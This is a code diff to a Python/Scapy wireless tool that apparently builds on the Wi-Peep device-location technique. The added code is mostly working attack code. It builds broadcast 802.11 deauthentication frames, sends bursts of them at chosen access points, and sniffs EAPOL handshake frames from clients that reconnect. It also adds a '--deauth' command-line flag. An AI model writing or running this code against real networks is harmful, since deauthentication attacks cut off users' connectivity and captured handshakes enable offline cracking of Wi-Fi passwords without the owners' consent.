@@ -92,6 +92,17 @@ class Handler:
         return pkt
 
 
+    def deauth(self, bssid):
+        """Generic broadcast deauth"""
+        return RadioTap()\
+               /Dot11(type = 0,
+                      subtype = 12,
+                      addr1 = 'ff:ff:ff:ff:ff:ff',
+                      addr2 = bssid,
+                      addr3 = bssid)\
+               /Dot11Deauth(reason = 7)
+
+
     def snarf(self, q):
         """Our sniff function"""
         sniff(iface = self.args.m, prn = lambda x: q.put(x), store = 0)
@@ -130,7 +141,12 @@ class Handler:
                                 if self.dsDict.get(x.addr3) is not None:
                                     if self.verbose is True:
                                         print(f'polo  - {x.addr2:17} {self.dsDict.get(x.addr3)[0].decode():20} {x.addr3} {x.dBm_AntSignal:4} {x.time}')
-                                # print(x.time)
+
+                            ## EAPOL sniff
+                            elif x.subtype == 8:
+                                if x.FCfield == 1:
+                                    if x.haslayer(EAPOL):
+                                        print(f'polo* - {x.addr2:17} {self.dsDict.get(x.addr3)[0].decode():20} {x.addr3} {x.dBm_AntSignal:4} {x.time}')
 
                 ## Queue warnings
                 y = q.qsize()
@@ -186,11 +202,16 @@ class Handler:
                         if self.verbose is True:
                             print(f'marco - {pkt.addr3:17} {self.dsDict.get(pkt.addr3)[0].decode():20} ff:ff:ff:ff:ff:ff {pkt.dBm_AntSignal:4} {pkt.time}')
 
-                        ### Hardcode cycle for polo
+                        ### Hardcode Wi-Peep cycle for polo
                         sendp(m, iface = self.args.i, count = self.args.count,
                               inter = self.args.inter, verbose = False)
                         if self.verbose is True:
-                            print(f'polo   - ~~~~~~~~~~~~~~~ > {self.dsDict.get(pkt.addr3)[0].decode()}')
+                            print(f'polo  - ~~~~~~~~~~~~~~~ > {self.dsDict.get(pkt.addr3)[0].decode()}')
+
+                        ### Hardcode deauth cycle for polo
+                        if len(self.args.b) > 0 and m.addr3 in self.args.b:
+                            sendp(self.deauth(pkt.addr3), iface = self.args.i, verbose = False, count = 10, inter = .3)
+                            print(f'polo* - ~~~~~~~~~~~~~~* > {self.dsDict.get(pkt.addr3)[0].decode()}')
         except Exception as E:
             print(E)
 
@@ -220,6 +241,7 @@ if __name__ == '__main__':
                         metavar = '<mon nic>', required = True)
     parser.add_argument('-t', help = 'Number of threads [Default is 40]')
     parser.add_argument('--count', help = 'Number of injected frames [Default is 15]')
+    parser.add_argument('--deauth', help = 'Broadcast deauth against bssid [Required -b] {* notates action/presence}', action = 'store_true')
     parser.add_argument('--ide', help = 'IPython mode', action = 'store_true')
     parser.add_argument('--inter', help = 'Interval between injected frames [Default is 3]')
     args = parser.parse_args()
